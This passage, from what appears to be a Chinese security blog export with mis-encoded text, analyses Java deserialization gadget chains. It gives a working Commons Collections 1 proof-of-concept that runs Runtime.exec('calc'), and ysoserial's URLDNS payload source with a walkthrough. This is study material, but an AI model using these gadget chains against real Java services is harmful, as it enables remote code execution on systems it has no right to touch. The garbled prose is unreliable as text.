æ„ä¹‰çš„ï¼Œè€Œä¸”è¿™é‡Œæœ¬èº«LazyMapå°±å®ç°äº†Mapæ¥å£ï¼Œæ‰€ä»¥åœ¨åˆ›å»ºä»£ç†å¯¹è±¡çš„æ—¶å€™ï¼Œå¯ä»¥åƒå‰é¢çš„POCé‚£æ ·æ„é€ ï¼Œä½†å…¶å®ä½¿ç”¨LazyMapä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = LazyMap.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } ä¹ŸæˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nCC1çš„å±€é™ åœ¨Java 8u71ä»¥åï¼Œå®˜æ–¹ä¿®æ”¹äº†sun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ã€‚\næ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ªLinkedHashMapå¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ã€‚æ‰€ä»¥ï¼Œåç»­å¯¹Mapçš„æ“ä½œéƒ½æ˜¯åŸºäºè¿™ä¸ªæ–°çš„LinkedHashMapå¯¹è±¡ï¼Œè€ŒåŸæ¥æˆ‘ä»¬ç²¾å¿ƒæ„é€ çš„Mapä¸å†æ‰§è¡Œsetæˆ–putæ“ä½œï¼Œä¹Ÿå°±ä¸ä¼šè§¦å‘RCEäº†ã€‚\nå‚è€ƒæ–‡ç« ï¼š ï¼ˆåé¢CCé“¾éƒ½æ˜¯è·Ÿè¿‡çš„ï¼Œè¿˜æœ‰çš„ä¸æ­¢CCé“¾ï¼Œå¯ä»¥å¤šçœ‹çœ‹åˆ«äººçš„åšå®¢ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ªäººçš„å°±æ˜¯ï¼Œå¼ºæ¨ï¼‰\nhttps://su18.org/post/ysoserial-su18-2/#%E6%94%BB%E5%87%BB%E6%9E%84%E9%80%A0-2\nhttps://xz.aliyun.com/t/10387?time__1311=Cqjx2Qi%3DomqGqGNDQieiKd7KF8DAhOi3RiD#toc-2\nå½“ç„¶niviaçš„åšå®¢ï¼š https://nivi4.notion.site/Java-CommonCollections2-bffcf256243d414192c43fdefc916df9\n","date":"2025-01-22T13:30:53+08:00","permalink":"https://fupanc-w1n.github.io/p/cc1/","title":"CC1"},{"content":"URLDNS URLDNSæ˜¯ysoserialä¸­åˆ©ç”¨é“¾çš„ä¸€ä¸ªåå­—ï¼Œé€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´ï¼Œè¯¥åˆ©ç”¨é“¾æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š\nURLDNS åˆ©ç”¨é“¾åªèƒ½å‘èµ·DNSè¯·æ±‚ï¼Œå¹¶ä¸èƒ½è¿›è¡Œå…¶ä»–åˆ©ç”¨ ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œä½¿ç”¨Javaå†…ç½®ç±»ï¼Œå¯¹ç¬¬ä¸‰æ–¹ä¾èµ–æ²¡æœ‰è¦æ±‚ ç›®æ ‡æ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡DNSè¯·æ±‚æ¥éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ å¯ä»¥åœ¨ysoserialé¡¹ç›®æºç é‡Œçœ‹åˆ°URLDNSåˆ©ç”¨é“¾çš„æºç ï¼Œåœ°å€ã€‚ä¹Ÿå¯ä»¥æ‰’åˆ°æœ¬åœ°æ¥å†åœ¨ideaä¸Šè°ƒè¯•ã€‚\nideaé…ç½®è°ƒè¯•ysoserial å…ˆç›´æ¥åœ¨githubä¸Šä¸‹è½½æºç ï¼Œç„¶åå†ç”¨ideaæ‰“å¼€è¿™ä¸ªé¡¹ç›®å³å¯ï¼Œæˆ‘ç”¨çš„JDK8ï¼Œæ­¤æ—¶pom.xmlä¼šæŠ¥é”™ï¼Œæ­¤æ—¶å°±ç‚¹å‡»ideaå³è¾¹çš„mï¼Œå¦‚ä¸‹ï¼š\nç„¶åå°†é‡Œé¢æ‰€æœ‰çš„é…ç½®æ–‡ä»¶å‹¾é€‰ï¼Œå†ç‚¹å‡»å·¦ä¸Šè§’ä¸¤ä¸ªç®­å¤´æ—‹è½¬çš„æ ‡è¯†å³å¯ã€‚\néšåå°±ä¸ä¼šå†æŠ¥é”™ã€‚\næ­¤æ—¶æˆ‘ä»¬å†çœ‹pom.xmlï¼Œæ¥æ‰¾é¡¹ç›®çš„å…¥å£ç‚¹ï¼ˆå°±æ˜¯ä¸»ç±»å’Œmainå‡½æ•°ï¼‰ï¼Œå¦‚ä¸‹ï¼š\næ ¹æ®è¿™ä¸ªæ‰¾åˆ° src/main/java/ysoserial/GeneratePayload.java\nç‚¹å‡»mainå‡½æ•°å·¦è¾¹çš„ç»¿è‰²ç®­å¤´ï¼Œç‚¹å‡»è°ƒè¯•ï¼Œä¸‹é¢å°±åªä¼šæ‰“å°usageï¼Œå¦‚ä¸‹ï¼š\nè¿™æ˜¯å› ä¸ºæ²¡åŠ ä»»ä½•å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“å¼€Debug Configurationsï¼š\nå†åœ¨è¿™é‡Œæ·»åŠ å‚æ•°å³å¯ï¼š\næˆ‘è¿™é‡Œæ˜¯æ·»åŠ çš„DNSï¼Œå¦‚ä¸‹ï¼š\nç„¶ååœ¨URLDNSçš„getObject()æ–¹æ³•åŠ ä¸€ä¸ªæ–­ç‚¹ï¼Œå†åœ¨mainå‡½æ•°ç‚¹å‡»è°ƒè¯•å°±èƒ½æ­£å¸¸è·å–å€¼ï¼Œå¦‚ä¸‹ï¼š å¯ä»¥çœ‹å‡ºå·²ç»æ­£å¸¸è·å–åˆ°äº†å€¼ã€‚åŒç†å¦‚æœæƒ³è¦ä½¿ç”¨å…¶ä»–è¯¸å¦‚CC1ä¹‹ç±»çš„é“¾å­ï¼Œå°±æ”¹ä¸º CommomCollections1 'id' å³å¯ã€‚\nåˆ©ç”¨é“¾åˆ†æ ä»ä¸»å‡½æ•°å¼€å§‹ï¼Œåœ¨æˆ‘ä¼ å…¥å‚æ•°åï¼Œæ¥è°ƒè¯•çœ‹ä¸€ä¸‹\nå¯ä»¥çœ‹åˆ°æ­¤æ—¶payloadTypeçš„å€¼ä¸ºURLDNSï¼Œé‚£ä¹ˆæˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹getPayloadClasså‡½æ•°ï¼Œ\nå¯ä»¥çœ‹å‡ºè¿™é‡Œä½¿ç”¨åå°„è°ƒç”¨äº†URLDNSç±»(åå°„éœ€è¦æ³¨æ„åŒ…çš„é—®é¢˜)ï¼Œå³URLDNSå¯¹åº”çš„è„šæœ¬çš„classå¯¹è±¡å¹¶å°†å…¶returnã€‚\næ­¤æ—¶å°±å¯ä»¥çœ‹åˆ° payloadClass çš„å€¼ä¸º class ysoserial.payloads.URLDNS ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­çœ‹åç»­ä»£ç ï¼Œå…ˆæ˜¯ä½¿ç”¨newInstance()å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†è°ƒç”¨å¯¹è±¡çš„getObject() æ–¹æ³•ï¼Œå³è„šæœ¬URLDNS.javaçš„getObject()æ–¹æ³•ï¼ŒCTRL+é¼ æ ‡å·¦é”®ç»§ç»­è·Ÿè¿›è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥å‘ç°å®šä¹‰çš„ä¸€ä¸ªæ¥å£ç±»ï¼Œåº”è¯¥æ˜¯URLDNSä¸­é‡å†™äº†è¿™ä¸ªæ–¹æ³•ï¼š\nç„¶åç»§ç»­è°ƒè¯•ï¼Œéšåä¼šè¿›å…¥åˆ°URLDNSç±»çš„getObject()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\nè¿™é‡Œå¯ä»¥çœ‹å‡ºURLDNSå®ç°äº†ObjectPayloadæ¥å£ï¼Œåœ¨è¿™é‡ŒURLDNSç±»é‡å†™äº† getObject() æ–¹æ³•å¹¶ä¸”æ­¤æ—¶çš„urlå³ä¸ºæˆ‘ä¼ è¿›å»çš„åŸŸåã€‚\nå…ˆç»§ç»­çœ‹mainï¼Œåœ¨getObject()æ–¹æ³•åï¼Œä¼šè°ƒç”¨serialize()æ–¹æ³•ï¼Œè·Ÿè¿›çœ‹ï¼š\nå¯ä»¥çœ‹åˆ°å°±æ˜¯åœ¨è¿™é‡Œè¿›è¡Œäº†åºåˆ—åŒ–ã€‚\nç°åœ¨ç»§ç»­åˆ†æURLDNSé“¾ï¼Œçœ‹URLDNS.javaæºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 package ysoserial.payloads; import java.io.IOException; import java.net.InetAddress; import java.net.URLConnection; import java.net.URLStreamHandler; import java.util.HashMap; import java.net.URL; import ysoserial.payloads.annotation.Authors; import ysoserial.payloads.annotation.Dependencies; import ysoserial.payloads.annotation.PayloadTest; import ysoserial.payloads.util.PayloadRunner; import ysoserial.payloads.util.Reflections; /** * A blog post with more details about this gadget chain is at the url below: * https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/ * * This was inspired by Philippe Arteau @h3xstream, who wrote a blog * posting describing how he modified the Java Commons Collections gadget * in ysoserial to open a URL. This takes the same idea, but eliminates * the dependency on Commons Collections and does a DNS lookup with just * standard JDK classes. * * The Java URL class has an interesting property on its equals and * hashCode methods. The URL class will, as a side effect, do a DNS lookup * during a comparison (either equals or hashCode). * * As part of deserialization, HashMap calls hashCode on each key that it * deserializes, so using a Java URL object as a serialized key allows * it to trigger a DNS lookup. * * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() * * */ @SuppressWarnings({ \u0026#34;rawtypes\u0026#34;, \u0026#34;unchecked\u0026#34; }) @PayloadTest(skip = \u0026#34;true\u0026#34;) @Dependencies() @Authors({ Authors.GEBL }) public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } é‡Œé¢ç»™äº†URLDNSçš„åˆ©ç”¨é“¾ï¼š\n1 2 3 4 5 6 7 /** * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode() */ è¿™é‡Œæ³¨æ„çœ‹URLDNSç±»çš„getObjectæ–¹æ³•ï¼Œysoserialä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³•è·å¾—Payloadã€‚å®¡è¿™ä¸ªæ–¹æ³•çš„æºç å¯ä»¥å‘ç°æœ€åè¿”å›çš„æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯æœ€åå°†è¢«åºåˆ—åŒ–çš„å¯¹è±¡ï¼Œåœ¨è¿™é‡Œæ˜¯HashMapã€‚è¿™é‡Œçœ‹ä¸€ä¸‹åˆ©ç”¨çš„getObject()æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation---åœ¨åˆ›å»ºæœ‰æ•ˆè´Ÿè½½æ—¶é¿å…DNSè§£æ //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; } è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªæ„é€ å¥½äº†çš„HashMapå¯¹è±¡ï¼Œè¯¥HashMapçš„é”®æ˜¯ä¸€ä¸ªç‰¹å®šçš„URLå¯¹è±¡ã€‚å½“æˆ‘ä»¬åœ¨åˆ©ç”¨æ—¶ï¼Œå³HashMapè¢«ååºåˆ—åŒ–æ—¶ï¼ŒURLå¯¹è±¡ä¼šè¢«ååºåˆ—åŒ–å¹¶è§¦å‘DNSè¯·æ±‚ã€‚ ç°åœ¨æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªgetObject()æ–¹æ³•ã€‚\nå¯¹äºç¬¬ä¸€éƒ¨åˆ†çš„å®ä¾‹åŒ–ä»£ç ï¼š\n1 URLStreamHandler handler = new SilentURLStreamHandler(); å…¶ä¸­çš„URLStreamHandleræ˜¯ä¸€ä¸ªæŠ½è±¡ç±»ï¼Œæ‰€ä»¥ä¸èƒ½å¤Ÿè¢«å®ä¾‹åŒ–ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨URLDNS.javaé‡Œåˆ›å»ºäº†ä¸€ä¸ªå­ç±»SilentURLStreamHandlerï¼Œå¹¶é‡å†™äº†getHostAddress()æ–¹æ³•å’ŒopenConnection()ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } } é‚£ä¹ˆè¿™é‡Œä¸ºä»€ä¹ˆè¦é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•å‘¢ï¼Ÿå¯¹äºopenConnection()æ–¹æ³•ï¼Œåº”è¯¥æ˜¯å› ä¸ºçˆ¶ç±»æ˜¯æŠ½è±¡ç±»å¹¶ä¸”å­ç±»ä¸æ˜¯æŠ½è±¡çš„ï¼Œæ‰€ä»¥å­ç±»å¿…é¡»å°†æ¥å£æ–¹æ³•å®ç°ã€‚\né‚£ä¹ˆä¸ºä»€ä¹ˆè¦é‡å†™getHostAddress()æ–¹æ³•å‘¢ï¼Œå¦‚æœå°†è¿™ä¸ªé‡å†™çš„æ–¹æ³•æ³¨é‡Šæ‰ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ç”Ÿæˆpayloadæ—¶ï¼Œå°±ä¼šè§¦å‘DNSè¯·æ±‚ï¼Œæˆ‘ä»¬æ¥çœ‹æ­£å¸¸çš„ getHostAddress() æ–¹æ³•\nåœ¨è¿™ä¸ªgetHostAddress()æ–¹æ³•ä¸­ï¼Œé‡Œé¢çš„**InetAddress.getByName(host)**æ–¹æ³•ä¼šå»å‘é€è¯·æ±‚ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡Œé‡å†™è¿™ä¸ªæ–¹æ³•ï¼Œè¿™æ ·åœ¨åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æ—¶ï¼Œä¸ä¼šè¯·æ±‚æˆ‘ä»¬çš„hostAddressã€‚\nè¿˜æœ‰ä¸€ä¸ªé‡è¦çš„ç‚¹å°±æ˜¯åœ¨URL.javaä¸­ï¼Œhandlerè¢«transinetå…³é”®å­—ä¿®é¥°ï¼Œåœ¨åºåˆ—åŒ–å¯¹è±¡çš„æ—¶å€™ï¼Œhandlerå±æ€§ä¸ä¼šè¢«åºåˆ—åŒ–ã€‚æ‰€ä»¥æ„å‘³ç€é‡å†™çš„æ–¹æ³•å¹¶ä¸ä¼šå¸¦è¿›æˆ‘ä»¬çš„payloadä¸­ï¼Œè¿™æ ·æˆ‘ä»¬åœ¨è§¦å‘ååºåˆ—åŒ–æ¼æ´æ—¶ï¼ŒgetHostAddresså¹¶æ²¡æœ‰è¢«é‡å†™ï¼Œèƒ½å¤Ÿæ­£å¸¸è¯·æ±‚æˆ‘ä»¬çš„ç½‘å€ã€‚è¿™ä¹Ÿæ˜¯æˆ‘è§‰å¾—å¾ˆç²¾å¦™çš„ä¸€ä¸ªåœ°æ–¹ã€‚\nï¼ˆè¿™é‡Œåªéœ€è¦äº†è§£ï¼Œå…·ä½“çš„è¯·æ±‚è¿‡ç¨‹çœ‹äº†åæ–‡å°±æ¸…æ¥šäº†ï¼‰\nç°åœ¨æ¥çœ‹ç¬¬äºŒéƒ¨åˆ†ï¼Œä¹Ÿæ˜¯æœ¬ç¯‡æ–‡ç« æœ€ä¸»è¦çš„éƒ¨åˆ†ï¼š\n1 2 3 4 5 6 7 HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. return ht; ç°åœ¨æ¥çœ‹HashMapç±»ï¼Œå®ç°äº†Serializableæ¥å£ï¼Œé‡å†™äº†readObject()æ–¹æ³•\nåœ¨ä¹‹å‰è¯´è¿‡çš„ååºåˆ—åŒ–çš„çŸ¥è¯†ç‚¹é‚£é‡Œå¯ä»¥çŸ¥é“è§¦å‘ååºåˆ—åŒ–çš„æ–¹æ³•æ˜¯readObjectï¼Œå¹¶ä¸”å› ä¸ºJavaå¼€å‘è€…ï¼ˆåŒ…æ‹¬Javaå†…ç½®åº“çš„å¼€å‘è€…ï¼‰ç»å¸¸ä¼šåœ¨è¿™â¾¥â¾¯å†™â¾ƒâ¼°çš„é€»è¾‘ï¼Œå¯¼è‡´åœ¨è¿™é‡Œå¯ä»¥æ„é€ åˆ©â½¤é“¾ã€‚\nç°åœ¨å°±çœ‹ä¸€ä¸‹HashMapç±»çš„readObject()æ–¹æ³•ï¼Œæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\u0026#34;loadFactor\u0026#34;, 0.75f); if (lf \u0026lt;= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\u0026#34;Illegal load factor: \u0026#34; + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); reinitialize(); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u0026lt; 0) { throw new InvalidObjectException(\u0026#34;Illegal mappings count: \u0026#34; + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u0026gt; 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u0026lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u0026gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u0026lt; MAXIMUM_CAPACITY \u0026amp;\u0026amp; ft \u0026lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\u0026#34;rawtypes\u0026#34;,\u0026#34;unchecked\u0026#34;}) Node\u0026lt;K,V\u0026gt;[] tab = (Node\u0026lt;K,V\u0026gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } ä¸»è¦ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 //è¯»å–é”®å’Œå€¼ï¼Œå¹¶å°†æ˜ å°„æ”¾å…¥HashMapä¸­ for (int i = 0; i \u0026lt; mappings; i++) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K) s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } //è·Ÿè¿›æºç å¯ä»¥çœ‹å‡ºè¿™é‡Œçš„readObjectæœ€ç»ˆæŒ‡å‘çš„å°±æ˜¯ObjectInputStreamç±»çš„readObjectæ–¹æ³•ï¼Œå³åœ¨è¿™é‡Œååºåˆ—åŒ–ï¼Œä½†æ˜¯åœ¨è¿™é‡Œåªæ˜¯HashMapç±»ååºçš„å…¶ä¸­ä¸€æ­¥ã€‚ ç†è§£ä¸€ä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹å‡ºé‡ç‚¹åœ¨\n1 putVal(hash(key), key, value, false, false); è¿™ä¸ªæ–¹æ³•çš„ä½œç”¨ä¸ºä¸ºæ·»åŠ é”®å€¼å¯¹åˆ°å“ˆå¸Œè¡¨ï¼Œè¿™é‡Œå…ˆåœä¸€ä¸‹ï¼Œç°åœ¨å…ˆæ¥çœ‹URLDNSç±»é‡Œé¢ä½¿ç”¨çš„å¯¹åº”çš„HashMaoç±»çš„putæ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š\n1 ht.put(u, url); æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªputæ–¹æ³•çš„æºä»£ç ï¼š\n1 2 3 public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„putçš„å†…å®¹æ˜¯å·®ä¸å¤šçš„ï¼Œç„¶ååœ¨getObjectçš„putæ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œå¼ºåˆ¶æ­¥å…¥ï¼Œå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ç»“æœï¼š\nä¹Ÿå°±æ˜¯å‰é¢ååºåˆ—åŒ–ç›¸å¯¹åº”çš„ä»£ç ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘åœ¨HashMapå¯¹è±¡ä¸­æ”¾è¿›çš„é”®å€¼å¯¹ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å…¶å®ä¹Ÿæ˜¯è°ƒç”¨çš„åŒæ ·çš„ä»£ç æ¥æ”¾å…¥ååºåˆ—åŒ–å¾—åˆ°çš„HashMapå¯¹è±¡ä¸­ã€‚\nç„¶åç»§ç»­çœ‹HashMapçš„readObject()ä¸­çš„putVal()æ–¹æ³•ï¼Œé‡Œé¢è°ƒç”¨äº†hash()æ–¹æ³•ï¼Œè·Ÿè¿›çœ‹ä¸€ä¸‹ï¼š\n1 2 3 4 static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u0026gt;\u0026gt;\u0026gt; 16); } ç®€å•æ¥è¯´å°±æ˜¯åˆ¤æ–­keyæ˜¯å¦ä¸ºnullï¼Œä¸ºNullçš„è¯å°±è¿”å›0ï¼Œå¦åˆ™å°†å¯¹keyè¿›è¡Œä½¿ç”¨hashCode()æ–¹æ³•åèµ‹å€¼ç»™hå¹¶å°†è¿™ä¸ªhè¿›è¡Œä½ç§»16ä½çš„å¼‚æˆ–æ“ä½œï¼Œåº”è¯¥æ—¶ç”²é…¸å“ˆå¸Œå€¼çš„æ“ä½œã€‚\né‡ç‚¹å°±åœ¨äºè¿™ä¸ªhashCode()æ–¹æ³•ï¼Œåœ¨ysoerialä¸­æˆ‘ä»¬äººä¸ºåœ°å°†keyæ”¹ä¸ºæˆ‘ä»¬ä¼ å…¥çš„java.net.URLå¯¹è±¡ï¼Œé‚£ä¹ˆç°åœ¨æ¥çœ‹è¿™ä¸ªç±»çš„hashCode()æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } //è¿™é‡Œéœ€è¦æ³¨æ„çš„å°±æ˜¯åœ¨è°ƒç”¨å®ŒhashCode()æ–¹æ³•åï¼Œå˜é‡hashCodeçš„å€¼ä¼šè¢«æ”¹å˜ã€‚ æ­¤æ—¶åˆ¤æ–­è¿™ä¸ªhashCodeæ˜¯å¦ä¸ºä¸º-1ï¼Œå¹¶ä¸”åœ¨URLç±»ä¸­çš„hashCodeå€¼é»˜è®¤ä¸º-1\nè¿™é‡Œå€¼ä¸º-1ï¼Œç„¶åç»§ç»­ï¼Œå½“ä¸º-1çš„æƒ…å†µä¸‹çš„handlerå¯¹è±¡ç±»å‹ä¸ºï¼š\næ‰€ä»¥è¿™é‡Œè°ƒç”¨çš„å°±æ˜¯URLStreamHandlerç±»çš„hashCode()æ–¹æ³•ï¼ˆè¿™é‡Œå¼ºè°ƒå¯¹è±¡ä¸æ–¹æ³•çš„æ‰€å±å…³ç³»ï¼Œåé¢æ‹‰é€šæ¥è®²å¾ˆæœ‰ç”¨ï¼‰ï¼Œæ‰€ä»¥æºä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 //è¿™ä¸ªæ–¹æ³•ä¼šå‘èµ·è¯·æ±‚å¹¶ä¸”è®¡ç®—hashCodeçš„å€¼ï¼Œæ‰€ä»¥è¿™é‡Œçš„hashCodeä¼šæ”¹å˜ protected int hashCode(URL u) { int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) { h += addr.hashCode(); } else { String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); } // Generate the file part. String file = u.getFile(); if (file != null) h += file.hashCode(); // Generate the port part. if (u.getPort() == -1) h += getDefaultPort(); else h += u.getPort(); // Generate the ref part. String ref = u.getRef(); if (ref != null) h += ref.hashCode(); return h; } uå°±æ˜¯æˆ‘ä»¬ä¼ 